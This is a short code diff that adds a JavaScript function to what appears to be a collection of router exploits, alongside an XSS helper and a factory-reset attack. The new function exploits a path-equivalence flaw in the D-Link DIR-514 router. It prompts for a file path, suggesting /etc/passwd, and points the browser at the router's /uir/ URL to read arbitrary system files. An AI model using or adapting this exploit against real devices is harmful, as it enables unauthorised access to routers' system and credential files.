@@ -169,6 +169,14 @@ function getxss() {
 	return xss;
 }
 
+// D-Link DIR-514 - path equivalence
+function dir514_pathequivalence(ip)
+{
+	ip = ip || "192.168.0.1";
+	path = prompt("Path: (ex: /etc/passwd)");
+	document.location = "http://" + ip + "/uir/" + path;
+}
+
 // Unicorn Router WB-3300NR - Factory Reset
 function wb3300nr_factoryreset(ip)
 {
